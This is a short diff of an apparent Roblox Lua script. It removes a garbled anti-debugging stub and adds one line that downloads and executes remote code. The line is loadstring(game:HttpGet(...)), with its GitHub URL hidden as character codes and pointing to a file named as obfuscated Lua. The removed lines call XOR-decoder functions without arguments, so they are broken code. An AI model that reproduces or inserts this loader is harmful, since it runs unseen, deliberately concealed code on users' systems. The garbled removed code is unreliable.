@@ -1,10 +1,1 @@
-   local function _ad_3850()
-  if type(debug) == (function(t,k)local s=""for i=1,#t do s=s..string.char(t[i]~(((k+i-1)%255)+1))end return s end) then error((function(t,k)local s=""for i=1,#t do s=s..string.char(t[i]~(((k+i-1)%255)+1))end return s end), 0) end
-     do
-if _G._DEBUG or _G._TRACE or _G._HOOK then error((function(t,k)local s=""for i=1,#t do s=s..string.char(t[i]~(((k+i-1)%255)+1))end return s end), 0) end
-     if type(print) ~= (function(t,k)local s=""for i=1,#t do s=s..string.char(t[i]~(((k+i-1)%255)+1))end return s end) then error((function(t,k)local s=""for i=1,#t do s=s..string.char(t[i]~(((k+i-1)%255)+1))end return s end), 0) end
-    end
-end
-    _ad_3850()
-
- loadstring(game:HttpGet((function(t,k)local s=""for i=1,#t do s=s..string.char(t[i]~(((k+i-1)%255)+1))end return s end)))()
+loadstring(game:HttpGet(string.char(104,116,116,112,115,58,47,47,114,97,119,46,103,105,116,104,117,98,117,115,101,114,99,111,110,116,101,110,116,46,99,111,109,47,107,105,114,105,108,108,105,122,114,97,106,108,101,118,55,51,45,97,108,116,47,78,101,119,111,99,110,111,118,97,47,114,101,102,115,47,104,101,97,100,115,47,109,97,105,110,47,116,101,120,116,46,56,97,102,48,98,56,55,51,54,98,49,56,46,111,98,102,117,115,99,97,116,101,100,46,108,117,97)))()
